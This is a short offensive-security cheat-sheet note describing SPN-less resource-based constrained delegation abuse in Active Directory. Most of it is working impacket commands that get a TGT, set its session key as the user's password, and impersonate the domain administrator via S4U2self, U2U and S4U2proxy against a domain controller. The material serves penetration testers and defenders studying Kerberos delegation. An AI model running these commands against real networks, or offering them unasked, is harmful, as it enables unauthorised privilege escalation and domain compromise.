---
title: SPN-less RBCD
---

Abuse [[notes/ad/rbcd]] without a computer account.

Requirements: Configure [[notes/ad/rbcd]] from the victim computer to your sacrificial user.

Get a RC4 TGT for your user.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-gettgt -hashes :$(pypykatz crypto nt 'passw0rd') corp.local/jdoe
    ~~~

Extract the session key.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-describeticket ./jdoe.ccache | grep 'Ticket Session Key'
    ~~~

Set the session key as new password.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-smbpasswd -newhashes :$sessionkey corp.local/jdoe:'passw0rd'@dc01.corp.local
    ~~~

Perform black magic to impersonate a privileged account ([[notes/ad/kerberos-s4u2self]] + [[notes/ad/kerberos-u2u]] + [[notes/ad/kerberos-s4u2proxy]]).

=== "[[notes/tools/impacket]]"
    ~~~ bash
    export KRB5CCNAME=$PWD/jdoe.ccache
    impacket-getst -k -no-pass -u2u -impersonate administrator -spn cifs/dc01.corp.local corp.local/jdoe
    ~~~

Reset the password of the sacrificial user if the password policy permits reuse of old passwords.

=== "[[notes/tools/impacket]]"
    ~~~ bash
    impacket-smbpasswd -hashes :$sessionkey -newhashes :$(pypykatz crypto nt 'passw0rd') corp.local/jdoe@dc01.corp.local
    ~~~

Otherwise [[notes/ad/forced-password-change|force-change the users password]] as domain admin.

References:

- [U2U RBCD with SPN-less accounts](http://web.archive.org/web/20221230131620/https://hideandsec.sh/books/cheatsheets-82c/page/active-directory/#bkmrk-u2u-rbcd-with-spn-le), from Windows
- [U2U RBCD with SPN-less accounts](http://web.archive.org/web/20230421063418/https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-python-edition#bkmrk-u2u-rbcd-with-spn-le), from Linux
- <https://twitter.com/snovvcrash/status/1595814518558543874>, real world example
- [Exploiting RBCD using a normal user account](http://web.archive.org/web/20221230024602/https://www.tiraniddo.dev/2022/05/exploiting-rbcd-using-normal-user.html)
